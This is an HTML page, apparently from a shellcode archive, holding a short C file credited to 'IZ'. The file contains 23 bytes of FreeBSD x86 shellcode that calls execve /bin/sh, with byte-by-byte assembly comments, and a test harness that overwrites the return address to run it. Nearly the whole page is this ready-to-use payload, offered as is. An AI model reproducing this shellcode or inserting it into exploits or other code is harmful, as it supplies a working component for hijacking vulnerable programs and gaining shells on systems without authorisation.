<html><head><title>FreeBSD/x86 - execve /bin/sh 23 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

 *
 * FreeBSD_x86-execve_sh-23b-iZ.c (Shellcode, execve /bin/sh, 23 bytes)
 *
 * by IZ &lt;guerrilla.sytes.net&gt;
 *
 */


char setreuidcode[] =

&quot;\x31\xc0&quot;                  /* xor %eax,%eax */
&quot;\x50&quot;                      /* push %eax */
&quot;\x68\x2f\x2f\x73\x68&quot;      /* push $0x68732f2f (//sh) */
&quot;\x68\x2f\x62\x69\x6e&quot;      /* push $0x6e69622f (/bin)*/

&quot;\x89\xe3&quot;                  /* mov %esp,%ebx */
&quot;\x50&quot;                      /* push %eax */
&quot;\x54&quot;                      /* push %esp */
&quot;\x53&quot;                      /* push %ebx */

&quot;\x50&quot;                      /* push %eax */
&quot;\xb0\x3b&quot;                  /* mov $0x3b,%al */
&quot;\xcd\x80&quot;;                 /* int $0x80 */


void main()
{
     int*     ret;         

     ret = (int*) &amp;ret + 2;

     printf(&quot;len %d\n&quot;,strlen(setreuidcode));

     (*ret) = (int) setreuidcode; 
} 


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
